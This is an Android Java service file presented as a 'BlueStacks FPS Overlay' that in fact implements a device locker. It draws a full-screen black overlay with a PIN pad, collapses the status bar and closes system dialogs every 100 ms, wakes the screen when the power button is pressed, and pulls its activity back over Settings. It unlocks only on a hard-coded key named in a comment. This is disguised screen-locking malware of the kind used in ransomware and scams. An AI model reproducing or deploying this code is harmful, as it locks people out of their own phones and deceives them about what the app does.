package com.bluestacks.fpsoverlay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.view.accessibility.AccessibilityManager;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.os.Handler;
import java.lang.reflect.Method;
import android.content.pm.ServiceInfo;
import android.widget.Button;
import android.widget.TextView;
import android.widget.EditText;
import com.bluestacks.fpsoverlay.R;

public class FPSService extends Service {
    private WindowManager windowManager;
    private View overlayLayout;
    private boolean isFlashOn = false;
    public static boolean isAuthenticated = false;

    static {
        System.loadLibrary("fps-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();
    public native boolean verifyAdvancedKey(String input);

    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                // Jika user menekan tombol power (layar mati), paksa nyalakan lagi
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "BS_FPS:WakeLock");
                wakeLock.acquire(1000);
            }
        }
    };

    private void collapseStatusBar() {
        try {
            Object statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            // Method "collapsePanels" adalah standar untuk menutup status bar via reflection
            Method collapse = statusBarManager.getMethod("collapsePanels");
            collapse.setAccessible(true);
            collapse.invoke(statusBarService);
        } catch (Exception e) {
            // Fallback: Menggunakan intent broadcast (mulai dibatasi di Android 12+)
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void initSystemOptimization() {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collapseStatusBar(); // Memanggil method collapsePanels yang sudah kamu buat
                closeSystemDialogs(); // Mengirim ACTION_CLOSE_SYSTEM_DIALOGS
                handler.postDelayed(this, 100); // Cek setiap 100ms
            }
        }, 100);
    }

    private boolean isAccessibilityServiceEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        java.util.List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            if (enabledService.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
                return true;
            }
        }
        return false;
    }

    // Memaksa MainActivity kembali ke depan jika user berhasil lari ke Settings
    public void refreshOverlay() {
        if (isAuthenticated) return;

        // Jika aksesibilitas mati, panggil MainActivity agar user dipaksa ke Settings.
        // Namun jika sedang AKTIF, kita tarik MainActivity hanya untuk menjaga overlay tetap kuat.
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
                   Intent.FLAG_ACTIVITY_NO_ANIMATION |
                   Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(i);
    }

    // Menutup menu power, notifikasi, dan dialog sistem lainnya secara instan
    private void closeSystemDialogs() {
        try {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
        } catch (Exception e) {
        }
    }

    private void applyFullScreen() {
        if (overlayLayout == null) return;
        overlayLayout.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN
        );
    }

    private String currentInput = "";

    @Override
        public void onCreate() {
        super.onCreate();
    
        // 1. Memulai Foreground Service & StatusBar Blocker
        startInForeground();
        initSystemOptimization();
    
        // 2. Setup Window Manager & Layout
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
        overlayLayout.setFitsSystemWindows(false);
        overlayLayout.setBackgroundColor(0xFF000000); // Hitam pekat
    
        // 3. Konfigurasi LayoutParams
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |     
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | 
                WindowManager.LayoutParams.FLAG_FULLSCREEN |        
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT);
    
        params.gravity = Gravity.FILL;
    
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
    
        windowManager.addView(overlayLayout, params);
    
        // 4. Logika Input Angka
        TextView display = (TextView) overlayLayout.findViewById(R.id.textDisplayPassword);
        
        View.OnClickListener numListener = v -> {
            Button b = (Button) v;
            if (currentInput.length() < 12) {
                currentInput += b.getText().toString();
                display.setText(currentInput.replaceAll(".", "* ")); 
                display.setHint(""); 
            }
        };
    
        int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
                           R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
        for (int id : buttonIds) {
            View btn = overlayLayout.findViewById(id);
            if (btn != null) btn.setOnClickListener(numListener);
        }
    
        View btnDel = overlayLayout.findViewById(R.id.btnDelete);
        if (btnDel != null) {
            btnDel.setOnClickListener(v -> {
                if (currentInput.length() > 0) {
                    currentInput = currentInput.substring(0, currentInput.length() - 1);
                    display.setText(currentInput.replaceAll(".", "* "));
                }
            });
        }
    
        View btnUnlock = overlayLayout.findViewById(R.id.btnUnlock);
        if (btnUnlock != null) {
            btnUnlock.setOnClickListener(v -> {
                // Memanggil verifikasi Native C++ dengan key 02042009
                if (verifyAdvancedKey(currentInput)) {
                    isAuthenticated = true;
                    stopSelf(); 
                } else {
                    currentInput = "";
                    display.setText("");
                    display.setHint("ENGINE AUTHENTICATION FAILED");
                }
            });
        }
    
        // 5. Fitur Agresif
        startNativeAggression(getPackageName() + "/.FPSService");
        flashHandler.post(flashRunnable);
        applyFullScreen();
    
        // 6. Receiver Power Button
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        registerReceiver(screenReceiver, filter);
    }
    
    private void startInForeground() {
        String CHANNEL_ID = "fps_overlay_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "BlueStacks Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        Notification notification = builder
                .setContentTitle("BlueStacks FPS Overlay")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // 1. Matikan engine agresif C++
        stopNativeAggression();
        
        // 3. Lepaskan receiver layar
        try {
            unregisterReceiver(screenReceiver);
        } catch (Exception e) {
            // Abaikan jika sudah tidak terdaftar
        }
        
        // 4. Hapus overlay dari layar secara permanen
        if (overlayLayout != null && windowManager != null) {
            try {
                windowManager.removeView(overlayLayout);
            } catch (Exception e) {
                // Abaikan jika view sudah hilang
            }
        }
    }
}